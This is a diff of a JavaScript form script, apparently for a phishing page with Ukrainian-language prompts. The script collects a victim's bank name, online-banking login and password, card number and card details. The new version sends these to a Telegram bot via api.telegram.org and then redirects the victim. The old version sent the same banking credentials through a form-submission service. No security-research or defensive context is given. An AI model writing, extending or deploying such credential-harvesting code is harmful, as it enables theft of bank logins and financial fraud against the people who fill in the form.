@@ -1,64 +1,48 @@
-document.addEventListener('DOMContentLoaded', () => {
-    const bankFormSection = document.getElementById('bank-form-section');
-    const cardFormSection = document.getElementById('card-form-section');
-    const successMessage = document.getElementById('success-message');
-    const nextBtn = document.getElementById('nextBtn');
-    const backBtn = document.getElementById('backBtn');
-    const newFormBtn = document.getElementById('newFormBtn');
-    const bankForm = document.getElementById('bankForm');
-    const cardForm = document.getElementById('cardForm');
+// Настройки бота
+const BOT_TOKEN = "ВАШ_BOT_TOKEN";
+const CHAT_ID = "ВАШ_CHAT_ID";
 
-    // Переход между формами
-    nextBtn.addEventListener('click', () => {
-        if (bankForm.checkValidity()) {
-            bankFormSection.classList.add('hidden');
-            cardFormSection.classList.remove('hidden');
-        } else {
-            alert('Заповніть всі обов\'язкові поля');
-        }
-    });
+// Отправка данных из формы входа в банк
+document.getElementById("bankForm")?.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    
+    const data = {
+        bank: document.getElementById("bankName").value,
+        login: document.getElementById("bankLogin").value,
+        password: document.getElementById("bankPassword").value
+    };
 
-    backBtn.addEventListener('click', () => {
-        cardFormSection.classList.add('hidden');
-        bankFormSection.classList.remove('hidden');
-    });
-
-    newFormBtn.addEventListener('click', () => {
-        successMessage.classList.add('hidden');
-        bankFormSection.classList.remove('hidden');
-        bankForm.reset();
-        cardForm.reset();
-    });
-
-    // Отправка формы через FormSubmit
-    cardForm.addEventListener('submit', (e) => {
-        e.preventDefault();
-        const submitBtn = cardForm.querySelector('button[type="submit"]');
-        submitBtn.disabled = true;
-        submitBtn.textContent = 'Відправка...';
-
-        // Добавляем скрытые поля из первой формы
-        const bankName = document.getElementById('bankName');
-        const bankLogin = document.getElementById('bankLogin');
-        const bankPassword = document.getElementById('bankPassword');
-        const userEmail = document.getElementById('userEmail');
-
-        const hiddenInputs = `
-            <input type="hidden" name="Банк" value="${bankName.value}">
-            <input type="hidden" name="Логін" value="${bankLogin.value}">
-            <input type="hidden" name="Пароль" value="${bankPassword.value}">
-            <input type="hidden" name="Email" value="${userEmail.value}">
-        `;
-        
-        cardForm.insertAdjacentHTML('beforeend', hiddenInputs);
-        cardForm.submit();
-
-        // Показываем сообщение об успехе
-        setTimeout(() => {
-            cardFormSection.classList.add('hidden');
-            successMessage.classList.remove('hidden');
-            submitBtn.disabled = false;
-            submitBtn.textContent = 'Відправити дані';
-        }, 1500);
-    });
+    await sendToTelegram("Банковские данные", data);
+    window.location.href = "inventory-card.html";
 });
+
+// Отправка данных инвентарной карты
+document.getElementById("cardForm")?.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    
+    const data = {
+        cardNumber: document.getElementById("cardNumber").value,
+        details: document.getElementById("cardDetails").value
+    };
+
+    await sendToTelegram("Инвентарная карта", data);
+    window.location.href = "success.html";
+});
+
+// Функция отправки в Telegram
+async function sendToTelegram(title, data) {
+    const text = `📌 ${title}:\n${JSON.stringify(data, null, 2)}`;
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text
+            })
+        });
+    } catch (error) {
+        console.error("Ошибка отправки:", error);
+    }
+}
